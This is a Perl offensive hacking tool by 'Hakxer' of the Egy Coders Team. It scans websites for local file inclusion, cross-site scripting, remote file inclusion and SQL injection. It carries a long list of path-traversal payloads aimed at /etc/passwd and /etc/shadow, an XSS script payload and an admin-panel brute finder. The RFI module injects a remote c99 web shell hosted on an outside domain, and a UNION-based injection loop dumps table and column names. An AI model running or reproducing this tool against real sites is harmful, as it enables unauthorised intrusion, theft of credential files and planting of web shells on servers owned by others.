#!usr/bin/perl
#      ______    __  __   ______          __                ______                   
#     / ____/___ \ \/ /  / ____/___  ____/ /__  __________ /_  __/__  ____ _____ ___ 
#    / __/ / __ `/\  /  / /   / __ \/ __  / _ \/ ___/ ___/  / / / _ \/ __ `/ __ `__ \
#   / /___/ /_/ / / /  / /___/ /_/ / /_/ /  __/ /  (__  )  / / /  __/ /_/ / / / / / /
#  /_____/\__, / /_/   \____/\____/\__,_/\___/_/  /____/  /_/  \___/\__,_/_/ /_/ /_/ 
#        /____/              EgY Tool Multiple V 1.0::Hakxer                        
# Coded by Hakxer [Egy Coders Team]
# hakxer.1@gmail.com
# EgY Tool .. Multiple v 1.0 [ Priv8 Tool ] 
# What's new in this version ? 
# 1- SQL Injection Options
#      * SQL Shema Extractor (V5) 
###################################################################
################# Vulnerability Scanner ###########################
############# 1- Local File Include ###############################
############# 2- Cross Site Scripting #############################
############# 3- Remote File Include ##############################
###################################################################
################## SQL Injection ##################################
############# 1- SQL Shema Extractor ##############################
###################################################################
#################### Service ##########################
############# 1- MD5 Generator ########################
############# 2- Encode Base64 ########################
############# 3- Decode Base64 ########################
############# 4- Control Paneel Researcher ############
##################################################################
# Coded by Hakxer . Greetz : EgY CoderS Team Member :)
# ExH , ProViDoR , Error Code , Bright D@rk , Stealth , Data_Fr34k3r
# Kof2002 , Sinaritx , HcJ 
###################################################################

system("CLS");
system("title EgY Multiple Tool V 1.0");

use Digest::MD5;
use MIME::Base64;
use HTTP::Request;
use LWP::UserAgent;
use LWP::Simple; 
			print "\t-----------------------------\n";
			print "\t-- EgY Multiple Tool v 1.0\n";
			print "\t--    Coded By Hakxer     \n";
			print "\t-- Greetz : All My Friend \n";
			print "\t----------------------------\n\n";

			print "\n\n 1) Vulnerability Scanner \n";
			print "\n 2) Other Service \n\n";
			print "--> ";
			$VS=<STDIN>;
			chomp $VS;
############################ Service ##################################
if($VS eq 2){

		print " 1) MD5 Generator \n";
		print " 2) Encode Base64\n";
		print " 3) Decode Base64\n";
		print " 4) Control Panel Researcher \n";

#--> Path Arrays for CPR
@CPR=(
'/admin/','/administrator/','/administration/','/admin.php','/adminstrator.php','/cp/','/admincp/','/admincontrol/',
'/adminarea/','/admin_control/','/siteadmin/','/rearea/','/webadmin/','scriptadmin/','siteadmin/','/login.php',
'/login/','/admin/home.asp');
		
			$serv=<STDIN>;
			chomp $serv;

					if($serv eq 1)
					{
					print " Enter Your String \n";
					$md=<STDIN>;
					chomp $md;
					print Digest::MD5->md5_hex("$md")
					}
						if($serv eq 2){
						print " Enter String To Encode \n";
						$basd=<STDIN>;
						chomp $basd;
						$sss=encode_base64($basd);
						print "Your base64 Code Created : \n\n $sss \n";
						}
							if($serv eq 3){
							print " Enter String To Decode \n";
							$base=<STDIN>;
							chomp $base;
							$rrr=decode_base64($base);
							print " Decoded success : \n\n $rrr \n";
							}
							
							if($serv eq 4){
			print " Enter Site ex : http://www.site.com\n";
			$CP=<STDIN>;
			chomp $CP;
			
			print "\n";
			
foreach $CPP(@CPR){
$EEE=$CP.$CPP;

$V=HTTP::Request->new(GET=>$EEE);
$B=LWP::UserAgent->new();
$B->timeout(30);
$HEE=$B->request($V);

if($HEE->content =~ /Username/ ||
$HEE->content =~ /Password/ ){
print " \n Founded ==> $EEE\n\n";
}
else{print "Not Found ==> $EEE\n";}
			}
}
}
############################# Vulnerability Scanner ############################
		if($VS eq 1){

				print " 1) LFI Scan # Local File Include \n"; 
				print " 2) XSS Scan # Cross Site Scripting\n"; 
				print " 3) RFI Scan # Remote File Include \n"; 
				print " 4) SQL Scan # SQL Injection (MYSLQ) Scan\n";
				print " 5) ALL Scan # LFI , XSS , RFI  Scan ((( SQL Soon )))\n"; 

				print "\n\n -->";
		$answer=<STDIN>;
		chomp $answer;

		if($answer eq 1){
		sub LFI{
		print " Enter Site : e.x : http://www.site.com/index.php?q=\n\n";
		$site=<STDIN>;
		chomp $site;
		
		
			

#############################################LFI Scanner#########################################
if($site !~/http:\/\//){
     $site ="http://$site";}
				@devil=(
				'../../etc/passwd%00',
				'../../../etc/passwd%00',
				'../../../../etc/passwd%00',
				'../../../../../etc/passwd%00',
				'../../../../../../etc/passwd%00',
				'../../../../../../../etc/passwd%00',
				'../../../../../../../../etc/passwd%00',
				'../../../../../../../../../etc/passwd%00',
				'../../../../../../../../../../etc/passwd%00',
				'../../../../../../../../../../../etc/passwd%00',
				'../../../../../../../../../../../../etc/passwd%00',
				'../../../../../../../../../../../../../etc/passwd%00',
				'../../../../../../../../../../../../../../etc/passwd%00',
				'../../../../../../../../../../../../../../../..etc/passwd%00',
				'../../etc/passwd',
				'../../../etc/passwd',
				'../../../../etc/passwd',
				'../../../../../etc/passwd',
				'../../../../../../etc/passwd',
				'../../../../../../../etc/passwd',
				'../../../../../../../../etc/passwd',
				'../../../../../../../../../etc/passwd',
				'../../../../../../../../../../etc/passwd',
				'../../../../../../../../../../../etc/passwd',
				'../../../../../../../../../../../../etc/passwd',
				'../../../../../../../../../../../../../etc/passwd',
				'../../../../../../../../../../../../../../etc/passwd',
				'../../../../../../../../../../../../../../../..etc/passwd',
				'../etc/shadow',
				'../../etc/shadow',
				'../../../etc/shadow',
				'../../../../etc/shadow',
				'../../../../../etc/shadow',
				'../../../../../../etc/shadow',
				'../../../../../../../etc/shadow',
				'../../../../../../../../etc/shadow',
				'../../../../../../../../../etc/shadow',
				'../../../../../../../../../../etc/shadow',
				'../../../../../../../../../../../etc/shadow',
				'../../../../../../../../../../../../etc/shadow',
				'../../../../../../../../../../../../../etc/shadow',
				'../../../../../../../../../../../../../../etc/shadow',
				'../etc/group',
				'../../etc/group',
				'../../../etc/group',
				'../../../../etc/group',
				'../../../../../etc/group',
				'../../../../../../etc/group',
				'../../../../../../../etc/group',
				'../../../../../../../../etc/group',
				'../../../../../../../../../etc/group',
				'../../../../../../../../../../etc/group',
				'../../../../../../../../../../../etc/group',
				'../../../../../../../../../../../../etc/group',
				'../../../../../../../../../../../../../etc/group',
				'../../../../../../../../../../../../../../etc/group',
				'../etc/security/group',
				'../../etc/security/group',
				'../../../etc/security/group',
				'../../../../etc/security/group',
				'../../../../../etc/security/group',
				'../../../../../../etc/security/group',
				'../../../../../../../etc/security/group',
				'../../../../../../../../etc/security/group',
				'../../../../../../../../../etc/security/group',
				'../../../../../../../../../../etc/security/group',
				'../../../../../../../../../../../etc/security/group',
				'../etc/security/passwd',
				'../../etc/security/passwd',
				'../../../etc/security/passwd',
				'../../../../etc/security/passwd',
				'../../../../../etc/security/passwd',
				'../../../../../../etc/security/passwd',
				'../../../../../../../etc/security/passwd',
				'../../../../../../../../etc/security/passwd',
				'../../../../../../../../../etc/security/passwd',
				'../../../../../../../../../../etc/security/passwd',
				'../../../../../../../../../../../etc/security/passwd',
				'../../../../../../../../../../../../etc/security/passwd',
				'../../../../../../../../../../../../../etc/security/passwd',
				'../../../../../../../../../../../../../../etc/security/passwd',
				'../etc/security/user',
				'../../etc/security/user',
				'../../../etc/security/user',
				'../../../../etc/security/user',
				'../../../../../etc/security/user',
				'../../../../../../etc/security/user',
				'../../../../../../../etc/security/user',
				'../../../../../../../../etc/security/user',
				'../../../../../../../../../etc/security/user',
				'../../../../../../../../../../etc/security/user',
				'../../../../../../../../../../../etc/security/user',
				'../../../../../../../../../../../../etc/security/user',
				'../../../../../../../../../../../../../etc/security/user'
				);
foreach $scanning(@devil)
{
				$run=$site.$scanning;
					$request =HTTP::Request->new(GET=>$run);
			$agent= LWP::UserAgent->new();
					$response=$agent->request($request);
						if($response->is_success && $response->content =~/root:x:/){
							open(MYFILE,'>>lfi.txt');
				print MYFILE $run;
			$ss="Vuln founded & Created in c:/lfi.txt";
			}
			else {
           $ss="not found";}
	print " $scanning =>[$ss]\n";
	}
}
&LFI;
}

##################################################XSS Scanner#################################################

elsif($answer eq 2){
			sub XSS{
			print " Enter Site to Cross it :D : like \n http://www.site.com/iq.php?id=\n\n";
			$xssans=<STDIN>;
			chomp $xssans;
					$xsscode='>"<script>alert("Hakxer")</script><div style="1';
						$xss=$xssans.$xsscode;
							$agent=LWP::UserAgent->new();
								$req=$agent->get("$xss");
								if($req->is_success && $req->content=~/Hakxer/){
							print "Vuln Founded ===============>>>>> & Created in C:/xss.txt ";
						open(XSS,'>>xss.txt');
					print XSS $xss;
				close (XSS);
			}
			else { 
				  print "Vuln Not Founded\n\n";
				  }
			}
			&XSS;
}

#####################################################RFI Scanner################################################

elsif($answer eq 3){
   sub RFI{
			print " Enter Site ex : http://www.site.com/qqq.php?w= \n";
			$rfi=<STDIN>;
			chomp $rfi;

					$rficode="http://younes.by.ru/c99.txt";
					$rfid=$rfi.$rficode;
					$request =HTTP::Request->new(GET=>$rfid);
					$agent= LWP::UserAgent->new();
					$response=$agent->request($request);
					if($response->is_success && $response->content =~/c99/){
					open(MYFILE,'>>rfi.txt');
					print MYFILE $rfid;
					$ss="Vuln founded & Created in c:/rfi.txt";
					}
					else {
				   $ss="Cant Bind";}
					print " $rfid =>[$ss]\n";
							}
			&RFI;
}
####################################################SQL Scanner#################################################
####################### Information_schema Extractor -- Version 5 -- ###########################################
					elsif($answer eq 4)
					{
					print " 1) Shema Extractor -- Version 5 -- \n";
					print " 2) SQL Injector \n";
					$choice=<STDIN>;
					chomp $choice;
					if($choice eq 1){
					print " Enter site ex : http://www.site.com/index.php?id=-1+union+select+1,2,3,hakxer,5,6,7 \n \n --> ";
					$sqlsite=<STDIN>;
					chomp $sqlsite;
					$concat="concat(0x3A3A46697273743A3A00,table_name,0x3A3A5365636F6E643A3A00,column_name,0x3A3A)";
					if($sqlsite=~/hakxer/){
					for($y=177;$y<=3000;$y++)
					{
					$sqlsite=~s/hakxer/$concat/;
					$sql="$sqlsite+from+information_schema.columns+LIMIT+$y,1--";
					$request1 =HTTP::Request->new(GET=>$sql);
					$agent1 = LWP::UserAgent->new();
					$response1=$agent1->request($request1)->as_string;
					if($response1 =~ m/.*?::First::(.*?)::Second::(.*?)::/){
					print " Table : $1    |||||    Column  : $2 \n";
					open(ex,'>>extract.txt');
					print ex "Table : $1    Column : $2 \n";
					close(ex);
					}
					}
					}
					}
####################### SQL Injector ################################################################
					if($choice eq 2){
					print " Soon ....... ";
					}
					
					}
					}

####################################################Scan All#######################################################
elsif($answer eq 5){
&LFI;
&XSS;
&RFI;
}